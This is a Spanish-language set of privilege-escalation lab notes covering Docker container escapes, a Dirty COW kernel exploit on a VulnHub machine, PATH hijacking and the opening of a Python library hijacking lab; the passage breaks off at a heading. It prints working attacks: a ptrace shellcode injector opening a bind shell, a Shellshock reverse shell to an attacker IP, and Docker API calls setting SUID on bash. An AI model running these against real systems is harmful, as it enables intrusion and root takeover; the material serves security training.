En esta sección exploraremos diversas técnicas para abusar de **Docker** con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host.
    
Las técnicas que se tratarán incluyen:
    
- Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host. Analizaremos cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
- Despliegue de contenedores con la compartición de procesos (**–pid=host**) y permisos privilegiados (**–privileged**). Veremos cómo inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema.
- Uso de **Portainer** para administrar el despliegue de un contenedor. Discutiremos cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
- Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinaremos cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.
    

### Más info:

- Links
    
    ubuntu - (”[https://ubuntu.com/server/docs/network-configuration](https://ubuntu.com/server/docs/network-configuration)”)
    
    exploitdb - (”[https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)")
    
    github (0x00) - (”[https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c#L33-L39](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c#L33-L39)”)
    
    0x00sec - (”[https://0x00sec.org/t/linux-infecting-running-processes/1097](https://0x00sec.org/t/linux-infecting-running-processes/1097)”)
    
    izertis - (”[https://ahorasomos.izertis.com/solidgear/portainer-io-monitorea-y-administra-docker-de-manera-sencilla-e-intuitiva/](https://ahorasomos.izertis.com/solidgear/portainer-io-monitorea-y-administra-docker-de-manera-sencilla-e-intuitiva/)”)
    
    github (styblope) - (”[https://gist.github.com/styblope/dc55e0ad2a9848f2cc3307d4819d819f?permalink_comment_id=4039627](https://gist.github.com/styblope/dc55e0ad2a9848f2cc3307d4819d819f?permalink_comment_id=4039627)”)
    
    hacktricks - (”[https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)”)
    

En esta serie de labs se verá como escapar de un contenedor de docker, es decir, una vez comprometido un contenedor, cómo se podría llegar a la máquina host.

## Instalación

- Instación
    
    Se usará una imagen de ubuntu server v22.04.2 LTS: [https://ubuntu.com/download/server](https://ubuntu.com/download/server)
    
    ![Untitled](/assets/Privesc/Docker-Breakout/Untitled.png)
    
    Al instalar la máquina ubuntu, en las conexiones de red, se debe esperar hasta que se asigne una IP.
    
    Nota: Si da error al instalar, deshabilitar la tarjeta de red de la máquina e instalar la máquina y activarla de nuevo cuando termine de instalarse.
    
    ![Untitled](/assets/Privesc/Docker-Breakout/Untitled 1.png)
    
    Habilitar SSH.
    
    ![Untitled](/assets/Privesc/Docker-Breakout/Untitled 2.png)
    
    Una vez instalado, se debe volver a activar la tarjeta de red y reiniciar la máquina y al iniciar la máquina se debe verificar la configuración de la red, si no se asigna dirección IP, seguir los siguientes pasos:
    
    Primero encender la tarjeta de red si está apagada:
    
    ```bash
    ip link set dev enp0s3 up
    ```
    
     Ahora configurar el cliente DHCP:
    
    Se debe crear una configuración Netplan en el archivo “/etc/netplan/99_config.yaml“ y añadir el siguiente contenido:
    
    ```bash
    network:
    	version: 2
    	renderer: nerworkd
    	ethernets:
    		enp0s3:
    			dhcp4: true
    ```
    
    Por último, aplicar la configuración:
    
    ```bash
    netplan apply
    ```
    
    Más info: [https://ubuntu.com/server/docs/network-configuration](https://ubuntu.com/server/docs/network-configuration)
    

## Lab #1: Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host

### Requerimientos

Máquina Ubuntu: bryan@hack4u

Contenedores de docker: 1 contenedor corriendo en la máquina Ubuntu y dentro de este contenedor, se creará otro contenedor.

### Instalación

Nota: Para mayor comodidad, se utiliza ssh para conectarse desde la máquina local a la máquina Ubuntu.

```bash
# Máquina Ubuntu
apt update
apt install docker.io
docker pull ubuntu:latest
docker run --rm -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash

# Contenedor
apt update
apt install docker.io
```

### Escenario

Cuando se instala docker, se crea un “Unix Socket File” que permite al usuario comunicarse con el demonio de docker, es gracias a esto que el usuario puede ver las imágenes y contenedores de docker. Este “Unix Socket File” se encuentra en “**var/run/docker.sock**”.

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 3.png)

Al intentar mostrar las imágenes en el contenedor de docker, se muestra el siguiente mensaje:

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 4.png)

Esto se muestra debido a que el cliente de docker no puede comunicarse con el demonio de docker, esto debido a que en el contenedor no existe el archivo socket “/var/run/docker.sock”.

Para solucionar esto se podría utilizar monturas para que el archivo “/var/run/docker.sock” de la máquina Ubuntu host, sea accesible dentro del contenedor:

```bash
# Máquina Ubuntu
	# Eliminar el contenedor actualmente creado
	docker rm $(docker ps -a -q) --force
	
	# Crear un nuevo contenedor con la montura
	docker run --rm 
	-v /var/run/docker.sock:/var/run/docker.sock 
	-dit --name ubuntuServer ubuntu

# Contenedor
apt update
apt install docker.io
```

### Explotación

Esto crea un problema de seguridad ya que ahora el contenedor se puede comunicar con el “Unix Socket File” de la máquina Ubuntu Host, esto significa que puede listar los contenedores pero también crearlos, de forma que cuando lo haga, es como si lo estuviese haciendo desde la máquina Ubuntu Host y podría aprovecharse de esto para crear un nuevo contenedor y utilizar monturas para montar toda la raíz a un archivo del nuevo contenedor.

![Captura de contendor con acceso al archivo “docker.sock” del host.](/assets/Privesc/Docker-Breakout/Untitled 5.png)

Captura de contendor con acceso al archivo “docker.sock” del host.

```bash
# Contenedor
docker run -dit -v /:/mnt/root --rm --name hacked ubuntu
docker exec -it hacked bash
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 6.png)

## Lab #2: Despliegue de contenedores con la compartición de procesos (**–pid=host**) y permisos privilegiados (**–privileged**)

### Requerimientos

Máquina Ubuntu: bryan@hack4u

Contenedores de docker: 1 contenedor corriendo en la máquina Ubuntu.

### Instalación

Nota: Para mayor comodidad, se utiliza ssh para conectarse desde la máquina local a la máquina Ubuntu.

```bash
# Máquina Ubuntu
apt update
apt install docker.io
docker pull ubuntu:latest
docker run --rm -dit --pid=host --privileged --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash

# Contenedor
apt update
apt install gcc netcat nano

```

### Escenario

Cuando se crea un contenedor con el parámetro “**`--pid=host`**”, hace que el contenedor pueda ver todos los procesos de la máquina host.

Por ejemplo, en la máquina host se comparte un servidor HTTP con Python con el comando “**`python3 -m http.server 80`**” esto creará un proceso y este proceso será visible en el contenedor gracias al parámetro especificado:

```bash
ps -faux
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 7.png)

Como se puede ver, se está corriendo el proceso de python para el servicio HTTP y el proceso lo está corriendo root.

### Explotación

Cuando se identifiquen procesos en los cuales el usuario que los corre es root, se podría aprovechar de ellos para que, a partir de este proceso, se cree un subproceso que permita ejecutar un shellcode.

Para esto se usarán los siguientes repositorios: [https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c#L33-L39](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c#L33-L39) y [https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128)

Lo que se hará para este lab es crear una “bind shell”, es decir, se abrirá un puerto (5600) de la máquina víctima con una shell, de forma que el atacante se podrá conectar a esta por netcat.

Para esto se creará un script en C y se usará la estructura de código del primer repositorio pero se cambiará el shellcode (líneas subrayadas).

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 8.png)

En lugar de este shellcode, se usará el que está en el segundo repositorio (línea subrayada en amarillo) y se cambiará el tamaño a 87 ya que es el tamaño correspondiente al shellcode:

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 9.png)

El código quedaría así:

- shellcode
    
    ```bash
    {% raw %}
    /*
      Mem Inject
      Copyright (c) 2016 picoFlamingo
    
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.
    
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
    
    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
    */
    
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <stdint.h>
    
    #include <sys/ptrace.h>
    #include <sys/types.h>
    #include <sys/wait.h>
    #include <unistd.h>
    
    #include <sys/user.h>
    #include <sys/reg.h>
    
    #define SHELLCODE_SIZE 87
    
    unsigned char *shellcode = 
      "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";
    
    int
    inject_data (pid_t pid, unsigned char *src, void *dst, int len)
    {
      int      i;
      uint32_t *s = (uint32_t *) src;
      uint32_t *d = (uint32_t *) dst;
    
      for (i = 0; i < len; i+=4, s++, d++)
        {
          if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
    	{
    	 perror ("ptrace(POKETEXT):");
    	 return -1;
    	}
        }
      return 0;
    }
    
    int
    main (int argc, char *argv[])
    {
      pid_t                   target;
      struct user_regs_struct regs;
      int                     syscall;
      long                    dst;
    
      if (argc != 2)
        {
          fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
          exit (1);
        }
      target = atoi (argv[1]);
      printf ("+ Tracing process %d\n", target);
    
      if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
        {
          perror ("ptrace(ATTACH):");
          exit (1);
        }
    
      printf ("+ Waiting for process...\n");
      wait (NULL);
    
      printf ("+ Getting Registers\n");
      if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
        {
          perror ("ptrace(GETREGS):");
          exit (1);
        }
      
    
      /* Inject code into current RPI position */
    
      printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
      inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);
    
      regs.rip += 2;
      printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);
    
      if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
        {
          perror ("ptrace(GETREGS):");
          exit (1);
        }
      printf ("+ Run it!\n");
    
     
      if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
    	{
    	 perror ("ptrace(DETACH):");
    	 exit (1);
    	}
      return 0;
    
    }
    {% endraw %}
    ```
    

Ahora se compila el script y al ejecutarlo, se le debe especificar el PID del proceso del cual se quiere aprovechar, en este caso será el de la ejecución de python con el servidor HTTP:

```bash
gcc exploit.c -o exploit

./exploit <PID>
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 10.png)

Esto lo que hizo fue abrir el puerto 5600 de la máquina host Ubuntu por lo que ahora el atacante puede conectarse con netcat a ese puerto.

```bash
nc 172.17.0.1 5600
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 11.png)

## Lab #3: Uso de **Portainer** para administrar el despliegue de un contenedor

### Requerimientos

Máquina Ubuntu: bryan@hack4u

Contenedores de docker: 1 contenedor Portainer corriendo en la máquina Ubuntu.

### ¿Qué es Portainer?

Portainer es una herramienta web open-source la cual se ejecuta ella misma como un container, por tanto deberemos tener Docker instalado. Esta aplicación nos va a permitir gestionar de forma muy fácil e intuitiva nuestros contenedores Docker a través de una interfaz gráfica.

### Instalación

```bash
# Máquina Ubuntu
apt update
apt install docker.io
docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce
```

Una vez instalado, se podrá acceder al panel del Portainer en la dirección de la máquina Ubuntu por el puerto 9000.

Primero se debe crear una cuenta.

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 12.png)

Una vez creada la cuenta, habrá que darle a “Get Started” y se mostrará un entorno y en él se verá información de la cantidad de contenedores, imágenes y entre otras cosas que hay.

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 13.png)

### Escenario

La idea para este lab es ver cómo se podría aprovechar de un Portainer para escalar privilegios. Un atacante podría encontrarse con un Portainer y si este llegara a vulnerar el panel de logueo, se podría aprovechar para escalar privilegios de una manera parecida a la vista en el primer lab, es decir, con monturas.

### Explotación

Portainer tiene muchas opciones para gestionar contenedores y entre ellas está la de crearlos, además, hay que tomar en cuenta que al crear el Portainer mismo, se montó el “Unix Socket File” de docker de la máquina host en el contenedor, es por ello que se aprovechará de esto para crear un nuevo contenedor y montar todo la raíz, de la máquina host, en el nuevo contenedor.

Para esto, hay que irse al apartado de “Container” para añadir uno nuevo y se deberá incluir toda la configuración necesaria para el contenedor y el tema de monturas se configura de la siguiente manera:

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 14.png)

Una vez creado el contendor, este se verá reflejado en la lista de contenedores, y ahora para abrir una nueva consola, se da click en el ícono mostrado en la imagen:

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 15.png)

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 16.png)

## Lab #4: Abuso de la **API** de **Docker**

### Requerimientos

Máquina Ubuntu: bryan@hack4u

Contenedores de docker: 1 contenedor corriendo en la máquina Ubuntu.

### ¿Qué es la API de Docker?

La API de Docker es una interfaz de programación de aplicaciones (API) que permite a los desarrolladores interactuar con el motor de Docker y gestionar contenedores, imágenes, redes y volúmenes mediante solicitudes HTTP. El servicio que corre en los puertos 2375 y 2376 es el demonio de Docker, que expone esta API para permitir la comunicación con el motor de Docker.

- El puerto 2375 suele ser el puerto predeterminado para la API no cifrada de Docker, lo que significa que las solicitudes a este puerto no están protegidas por SSL/TLS. Exponer este puerto sin protección puede ser un riesgo de seguridad, ya que cualquier persona que tenga acceso a este puerto podría interactuar con el motor de Docker y realizar operaciones no deseadas.
- El puerto 2376, por otro lado, suele ser el puerto predeterminado para la API de Docker cifrada mediante SSL/TLS, lo que proporciona una capa adicional de seguridad al comunicarse con el motor de Docker.

### Instalación

```bash
# Máquina Ubuntu
apt update
apt install docker.io
apt install net-utils

# Una vez terminado de activar la API, crear un nuevo 
# contenedor
docker pull ubuntu:latest
docker run -dit --rm --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash

# Contenedor
apt update
apt install curl jq
```

Para activar la API de docker, primero se debe crear un archivo llamado “daemon.json” dentro del directorio “/etc/docker” con el siguiente contenido:

Nota: Todo esto se hace en la máquina Ubuntu host.

```bash
{% raw %}
{"hosts": ["tcp://0.0.0.0:2375", "unix:///var/run/docker.sock"]}
{% endraw %}
```

Crear el directorio “docker.service.d” dentro de “/etc/systemd/system/” y dentro de este directorio creado, añadir un archivo de configuración llamado “override.conf” con el siguiente contenido.

```bash
[Service]
ExecStart=
ExecStart=/usr/bin/dockerd
```

Y por último reiniciar el demonio de systemd y docker:

```bash
systemctl daemon-reload
systemctl restart docker.service
```

Ahora si se verifican los puertos en escucha, se puede ver el puerto 2375 abierto:

```bash
netstat -nat
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 17.png)

### Escenario

La idea para este lab es utilizar curl para crear un nuevo contenedor a través de la API de Docker sin tener docker instalado

### Enumeración

Para verificar que existe una API de Docker, se suele enviar una cadena vacía a todo el rango de IPs de la subred en la que se encuentre, por el puerto 2375 y si devuelve un código de estado exitoso es que el puerto está abierto.

```bash
echo '' > /dev/tcp/172.17.0.1/2375
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 18.png)

También se podría comprobar enviando una petición por curl:

```bash
# Comprobar la versión de docker
curl -s "http://172.17.0.1:2375/version" | jq

# Comprobar imágenes existentes
curl -s "http://172.17.0.1:2375/images/json" | jq

# Comprobar imágenes existentes
curl -s "http://172.17.0.1:2375/containers/json" | jq
```

### Explotación

Se creará un contenedor que montará toda la raíz de la máquina host en el nuevo contenedor.

Nota: Se debe especificar el nombre del contenedor en el parámetro “name” y se debe poner el nombre de la imagen correspondiente en “Image”

```bash
{% raw %}
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/create?name=test -d '{"Image":"ubuntu:latest", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
{% endraw %}
```

Esto devolverá un ID el cual se debe copiar:

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 19.png)

ccf0aa17b28c8a37da810e00b2614e658f81e33a7287069a7b8787a42951e18e

Ahora se debe correr el contenedor con el siguiente comando:

Nota: En el campo ID se debe ingresar el ID proporcionado en el comando anterior el cual corresponde al del contenedor.

```bash
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/<ID>/start?name=test
```

Ahora toca la ejecución de comandos. Ya la raíz de la máquina host está montada en el directorio “/mnt” del contenedor por lo que ahora se ejecutará un comando para añadir el permiso SUID a la “/bin/bash”.

```bash
{% raw %}
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/ccf0aa17b28c8a37da810e00b2614e658f81e33a7287069a7b8787a42951e18e/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/bin/bash"]}'
{% endraw %}
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 20.png)

Esto proporcionará un ID el cual se debe usar para ejecutar el comando:

```bash
{% raw %}
curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/exec/7e0005e8f679e9bab801b833333b47827034c33c6af04833dafb85de0a0b1b8a/start -d '{}'
{% endraw %}
```

![Untitled](/assets/Privesc/Docker-Breakout/Untitled 21.png)

Nota: Si se quiere ver el output de un comando, por ejemplo el de un cat, se debe ingresar el parámetro “**`--output -`**” al final del comando curl.

# Explotación del Kernel

    
El **kernel** es la parte central del sistema operativo Linux, que se encarga de administrar los recursos del sistema, como la memoria, los procesos, los archivos y los dispositivos. Debido a su papel crítico en el sistema, cualquier vulnerabilidad en el kernel puede tener graves consecuencias para la seguridad del sistema.
    
En versiones antiguas del kernel de Linux, se han descubierto vulnerabilidades que pueden ser explotadas para permitir a los atacantes obtener acceso de superusuario (**root**) en el sistema.
    
La elevación de privilegios se refiere a la técnica utilizada por los atacantes para obtener permisos elevados en el sistema, como superusuario (**root**), cuando solo tienen permisos limitados. Por ejemplo, un usuario con permisos limitados en el sistema podría utilizar una vulnerabilidad en el kernel para obtener acceso de superusuario y, posteriormente, comprometer el sistema.
    
Las vulnerabilidades del kernel pueden ser explotadas de varias maneras. Por ejemplo, un atacante podría aprovechar una vulnerabilidad en un controlador de dispositivo para obtener acceso al kernel y realizar operaciones maliciosas. Otra forma común en que se explotan las vulnerabilidades del kernel es mediante el uso de técnicas de desbordamiento de búfer, que permiten a los atacantes escribir código malicioso en áreas de memoria reservadas para el kernel.
    
Para mitigar el riesgo de vulnerabilidades del kernel, es importante mantener actualizado el sistema operativo y aplicar parches de seguridad tan pronto como estén disponibles.


### Más info:

- Links
    
    BlogUbuntu - (”[https://blogubuntu.com/que-es-dirty-cow](https://blogubuntu.com/que-es-dirty-cow)”)
    
    vk9-sec - (”[https://vk9-sec.com/overlayfs-local-privilege-escalation-cve-2015-1328/](https://vk9-sec.com/overlayfs-local-privilege-escalation-cve-2015-1328/)”)
    

## Escenario

Cuando un sistema operativo con un Kernel muy antiguo como versiones anteriores a 3.0, se hace propenso a muchas vulnerabilidades. En este lab se usará la máquina Sumo de VulnHub y se explotará la vulnerabilidad “Dirty Cow”.
Link de descarga: [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

## Reconocimiento

Primero se hará un escaneo con nmap para descubrir puertos abiertos:

```bash
nmap -p- -sS --open -vvv -n -Pn 192.168.0.106
```

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled.png)

La máquina tiene el servicio HTTP abierto y la página se ve de la siguiente manera:

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 1.png)

Se hará un fuzzing de directorios con gobuster

```bash
gobuster dir -w /usr/share/wordlists/SecLists/
Discovery/Web-Content/directorio-list-2.3-medium 
-u http://192.168.0.106/ --add-slash
```

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 2.png)

Viendo el directorio “/cgi-bin/” se podría pensar en que el servidor es vulnerable a shellshock por lo que se buscarán archivos pl, sh, cgi, etc.

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 3.png)

Ahora se envía una petición con curl modificando el “User-Agent” para si el servidor es vulnerable a shellshock:

```bash
{% raw %}
curl -s "http://192.168.0.106/cgi-bin/test" 
-H "User-Agent: () { :; }; echo; /usr/bin/whoami"
{% endraw %}
```

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 4.png)

Ahora se puede obtener una reverse shell:

```bash
{% raw %}
curl -s "http://192.168.0.106/cgi-bin/test" 
-H "User-Agent: () { :; }; echo; bash -i >& /dev/tcp/192.168.0.108/4646 0>&1"
{% endraw %}
```

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 5.png)

Y como se puede ver, al ver la versión del sistema operativo y del kernel, se ve son antiguas versiones antiguas:

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 6.png)

Al buscar vulnerabilidades presentes en  esta versión de kernel con searchsploit, se encuentran muchas y entre ellas, la vuln “Dirty Cow” en la que se puede explotar un Race Condition para escalar privilegios.

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 7.png)

- ¿Qué es Dirty Cow?
    
    Dirty COW es una vulnerabilidad de seguridad informática del kernel de Linux que afectó a todos los sistemas operativos basados en Linux, incluidos los dispositivos Android, que usaban versiones anteriores del kernel de Linux creadas antes de 2018.
    

Se moverá este script en C a la máquina local y se cambiará su nombre:

```bash
searchsploit -m 40839
mv 40839.c dirty.c
```

Este script ahora se debe mover a la máquina víctima para compilarlo con gcc:

```bash
# Máquina local
python -m http.server

----
wget http://192.168.0.108/dirty.c

```

Para ver cómo se compila el script, se puede abrir el script y filtrar por gcc:

```bash
cat dirty.c | grep gcc
gcc -pthread dirty.c -o dirty -lcrypt
```

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 8.png)

El exploit se trata de un race condition que modificará el /etc/passwd añadiendo un nuevo usuario y cambiará el id del usuario basándose en las siguientes variables:

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 9.png)

Al ejecutar el script, se pedirá crear una nueva contraseña para el nuevo usuario que en este caso se llamará “firefart”.

```bash
./dirty
```

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 10.png)

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 11.png)

Como se puede ver, se creó el usuario firefart  y está asignado al grupo de root es posible loguearse utilizando la contraseña asignada.

![Untitled](/assets/Privesc/Kernel-Exploitation/Untitled 12.png)

## Herramientas para detectar vulnerabilidades

Linux-exploit-suggester: Esta herramienta sirve para analizar vulnerabilidades relacionadas al kernel. https://github.com/The-Z-Labs/linux-exploit-suggester

# PATH Hijacking

    
**PATH Hijacking** es una técnica utilizada por los atacantes para **secuestrar** **comandos** de un sistema Unix/Linux mediante la manipulación del **PATH**. El PATH es una variable de entorno que define las rutas de búsqueda para los archivos ejecutables en el sistema.
    
En algunos binarios compilados, algunos de los comandos definidos internamente pueden ser indicados con una ruta relativa en lugar de una ruta absoluta. Esto significa que el binario busca los archivos ejecutables en las rutas especificadas en el PATH, en lugar de utilizar la ruta absoluta del archivo ejecutable.
    
Si un atacante es capaz de alterar el PATH y crear un nuevo archivo con el mismo nombre de uno de los comandos definidos internamente en el binario, puede lograr que el binario ejecute la versión maliciosa del comando en lugar de la versión legítima.
    
Por ejemplo, si un binario compilado utiliza el comando “**ls**” sin su ruta absoluta en su código y el atacante crea un archivo malicioso llamado “**ls**” en una de las rutas especificadas en el PATH, el binario ejecutará el archivo malicioso en lugar del comando legítimo “**ls**” cuando sea llamado.
    
Para prevenir el PATH Hijacking, se recomienda utilizar **rutas absolutas** en lugar de rutas relativas en los comandos definidos internamente en los binarios compilados. Además, es importante asegurarse de que las rutas en el PATH sean controladas y limitadas a las rutas necesarias para el sistema. También se recomienda utilizar la opción de permisos de ejecución para los archivos ejecutables solo para los usuarios y grupos autorizados.
    

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
apt install gcc
```

## Escenario

La idea para este lab es aprovecharse de un binario compilado en el cual se utiliza una ruta relativa para ejecutar el comando “whoami”.

Por ejemplo, se tiene el siguiente código en C:

```bash
{% raw %}
#include <stdio.h>

int main(){
	setuid(0);
	printf("\n[+] Actualmente somos el usuario:\n\n");
	system("/usr/bin/whoami");
	printf("\n[+] Actualmente somos el usuario:\n\n");
	system("whoami");
	return 0;
}
{% endraw %}
```

Ahora se compila:

```bash
gcc test.c -o test
chmod u+s test
# Se aplica el SUID para que el usuario que ejecute 
# el binario lo haga como root
```

![Untitled](/assets/Privesc/PATH-Hijacking/Untitled.png)

![Untitled](/assets/Privesc/PATH-Hijacking/Untitled 1.png)

Como se puede ver, el código está ejecutando dos comandos “whoami”, con la diferencia de que uno se ejecuta utilizando la ruta absoluta y el otro se ejecuta utilizando la ruta relativa, hay que recordar que cuando se ejecuta un comando utilizando la ruta relativa, el sistema hace una búsqueda sobre la variable de entorno $PATH para encontrar la ruta absoluta de este comando, esto se hace leyendo la variable de izquierda a derecha.

## Explotación del PATH Hijacking

Utilizar una ruta relativa para ejecutar un comando es peligroso ya que el atacante podría llegar a identificar esto y podría modificar la variable de entorno $PATH para añadir una ruta prioritaria al inicio de la variable de la siguiente manera:

Primero se identifica que el archivo es un binario compilado de 64bits por lo que el contenido de este no es legible pero se puede usar el comando “strings” para identificar cadenas de caracteres legibles. Se puede ver que se está ejecutando el comando “whoami” utilizando su ruta relativa.

![Untitled](/assets/Privesc/PATH-Hijacking/Untitled 2.png)

![Untitled](/assets/Privesc/PATH-Hijacking/Untitled 3.png)

El atacante identifica esto y modifica la variable de entorno $PATH para que el directorio “/tmp/” esté al inicio, es decir, que sea prioritario. esto para ahora crear un script llamado “whoami” dentro de este directorio.

```bash
export PATH=/tmp/:$PATH

# resultado:
/tmp/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ahora el atacante crea un script con el nombre “whoami” dentro de “/tmp/” el cual contendrá la instrucción “bash -p”, todo esto con el objetivo de que cuando se ejecute el binario “test”, este ejecutará el comando “whoami” utilizando el falso “whoami” del atacante ya que el sistema buscará la ruta absoluta del comando en $PATH y verá el directorio “/tmp/” como prioritario y verá que en él está el script “whoami” de forma que se secuestra este binario para que haga una ejecución alternativa, en este caso para proporcionar una shell como root al atacante.

![Untitled](/assets/Privesc/PATH-Hijacking/Untitled 4.png)

# Python Library Hijacking
    
Cuando hablamos de ‘**Python Library Hijacking**‘, a lo que nos referimos es a una técnica de ataque que aprovecha la forma en la que Python busca y carga bibliotecas para inyectar código malicioso en un script. El ataque se produce cuando un atacante crea o modifica una biblioteca en una ruta accesible por el script de Python, de tal manera que cuando el script la importa, se carga la versión maliciosa en lugar de la legítima.
    
La forma en que el ataque se lleva a cabo es la siguiente: el atacante busca una biblioteca utilizada por el script y la reemplaza por su propia versión maliciosa. Esta biblioteca puede ser una biblioteca estándar de Python o una biblioteca externa descargada e instalada por el usuario. El atacante coloca su versión maliciosa de la biblioteca en una ruta accesible antes de que la biblioteca legítima sea encontrada.
    
En general, Python comienza buscando estas bibliotecas en el directorio actual de trabajo y luego en las rutas definidas en la variable sys.path. Si el atacante tiene acceso de escritura en alguna de las rutas definidas en sys.path, puede colocar allí su propia versión maliciosa de la biblioteca y hacer que el script la cargue en lugar de la legítima.
    
Además, el atacante también puede crear su propia biblioteca en el directorio actual de trabajo, ya que Python comienza la búsqueda en este directorio por defecto. Si durante la carga de estas librerías desde el script legítimo, el atacante logra secuestrarlas, entonces conseguirá una ejecución alternativa del programa.
    

## Instalación

```bash
docker pull ubuntu:latest
docker run -dit --name ubuntuServer ubuntu
docker exec -it ubuntuServer bash
apt update
updatedb
apt install python3 nano locate
```

En el archivo “/etc/sudoers” agregar la siguiente línea para que la usuaria sara pueda ejecutar el script de python como el usuario pepe:

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled.png)

Ahora, con el usuario pepe, se crea el script de python en el directorio /tmp/ con el siguiente contenido:

```bash
#!/usr/bin/python3

import hashlib

if __name__ == '__main__':
	string = "Hola, esta es mi cadena"

	print(hashlib.md5(cadena.encode()).hexdigest())
```

Lo que hace este script en mostrar la cadena en MD5 utilizando la librería “hashlib”.

## Escenario

El atacante de primeras verá que puede ejecutar, como el usuario pepe, un script de python sin proporcionar contraseña:

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 1.png)

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 2.png)

Al revisar los permisos del archivo, se ve que puede leer el script pero no modificarlo.

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 3.png)

## PATH para librerías de python

